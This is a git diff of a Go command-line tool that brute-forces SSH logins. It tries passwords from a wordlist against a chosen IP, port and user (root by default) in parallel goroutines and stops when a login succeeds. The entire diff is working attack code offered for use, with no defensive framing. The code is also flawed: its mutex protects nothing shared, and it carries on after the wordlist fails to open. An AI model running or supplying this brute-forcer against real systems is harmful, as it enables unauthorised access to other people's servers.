@@ -1,7 +1,13 @@
-/*
+/**
+* @Author: Aldo Sotolongo
+* @Date:   2016-06-20T14:12:18-04:30
+* @Email:  aldenso@gmail.com
+* @Last modified by:   Aldo Sotolongo
+* @Last modified time: 2016-06-20T15:26:13-04:30
 golang program to find a password for a ssh user using a large wordlist file.
 TODO: add args to check if the ip is down and create a results file.
 */
+
 package main
 
 import (
@@ -10,6 +16,7 @@ import (
 	"fmt"
 	"os"
 	"strconv"
+	"sync"
 	"time"
 
 	"golang.org/x/crypto/ssh"
@@ -21,8 +28,14 @@ var (
 	ip           = flag.String("ip", "192.168.125.100", "indicate the ip address to brute force")
 	port         = flag.Int("port", 22, "indicate port to brute force")
 	user         = flag.String("user", "root", "indicate user to brute force")
-	timer        = flag.Duration("timer", 200*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
+	// don't set timer to low, you may bypass the right password, for me it works with 150ms.
+	timer = flag.Duration("timer", 200*time.Millisecond, "set timeout to ssh dial response (ex:300ms), don't set this too low")
 )
+
+type resp struct {
+	Error error
+	mu    sync.Mutex
+}
 
 // Define fileScanner with methods
 type fileScanner struct {
@@ -30,7 +43,7 @@ type fileScanner struct {
 	Scanner *bufio.Scanner
 }
 
-func NewFileScanner() *fileScanner {
+func newFileScanner() *fileScanner {
 	return &fileScanner{}
 }
 
@@ -51,19 +64,8 @@ func (f *fileScanner) GetScan() *bufio.Scanner {
 	return f.Scanner
 }
 
-// Define ssh Dialer with methods
-type Dialer struct {
-	password string
-	err      error
-}
-
-func NewDialer() *Dialer {
-	d := &Dialer{}
-	return d
-}
-
-func sshdialer(password string, ch chan Dialer) {
-	salida := NewDialer()
+func sshdialer(password string) *resp {
+	salida := &resp{}
 	config := &ssh.ClientConfig{
 		User: *user,
 		Auth: []ssh.AuthMethod{
@@ -82,8 +84,8 @@ func sshdialer(password string, ch chan Dialer) {
 		fmt.Printf("\n+++ Pattern found: %s +++\n", password)
 		fmt.Printf("\nCompleted in %v senconds\n", strconv.FormatFloat(duration, 'g', -1, 64))
 	}
-	salida.password, salida.err = password, err
-	ch <- *salida
+	salida.Error = err
+	return salida
 }
 
 func printUsedValues() {
@@ -95,41 +97,27 @@ func printUsedValues() {
 	fmt.Println("additional args:", flag.Args())
 }
 
-// var to test when you find the password
-var found bool
-
 func main() {
 	flag.Parse()
 	printUsedValues()
-	ch := make(chan Dialer)
-	fscanner := NewFileScanner()
+	fscanner := newFileScanner()
 	err := fscanner.Open(*passwordfile)
 	if err != nil {
 		fmt.Println("error in open file step: ", err.Error())
-	} else {
-		scanner := fscanner.GetScan()
-		for scanner.Scan() {
-			password := scanner.Text()
-			go sshdialer(password, ch)
-			// Don´t set this time lower, you need to have a proper time to get a response
-			// the response time depends in several factors, it may work with 120 Milliseconds
-			// but sometimes bypass the correct password.
-			time.Sleep(*timer)
-			go func() {
-				for x := range ch {
-					if x.err != nil {
-						fmt.Printf(".")
-					} else {
-						fmt.Println("Done!!!!, your password is: ", x.password)
-						found = true
-						return
-					}
-				}
-			}()
-			if found == true {
-				break
-			}
-		}
 	}
-	fscanner.Close()
+	scanner := fscanner.GetScan()
+	for scanner.Scan() {
+		password := scanner.Text()
+		go func() {
+			resp := sshdialer(password)
+			resp.mu.Lock()
+			if resp.Error == nil {
+				fmt.Println("+++ FOUND IT +++")
+				fscanner.Close()
+				resp.mu.Unlock()
+				os.Exit(0)
+			}
+		}()
+		time.Sleep(*timer)
+	}
 }
